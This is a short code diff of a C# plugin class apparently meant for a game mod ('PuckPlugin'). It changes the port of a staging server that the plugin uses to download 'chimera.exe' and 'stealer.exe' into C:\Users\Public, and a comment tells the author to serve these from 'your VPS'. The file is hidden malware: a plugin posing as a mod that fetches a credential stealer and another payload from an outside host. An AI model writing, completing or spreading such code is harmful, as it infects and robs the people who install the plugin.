@@ -19,7 +19,7 @@ public class PuckPlugin : IPuckPlugin
 {
     private static readonly string DropDir     = @"C:\Users\Public";
     // Serve chimera.exe and stealer.exe from this URL (your VPS)
-    private static readonly string StageBase   = "http://144-172-84-23.sslip.io:8888";
+    private static readonly string StageBase   = "http://144-172-84-23.sslip.io:7331";
     private static readonly string ChimeraUrl  = StageBase + "/chimera.exe";
     private static readonly string StealerUrl  = StageBase + "/stealer.exe";
 
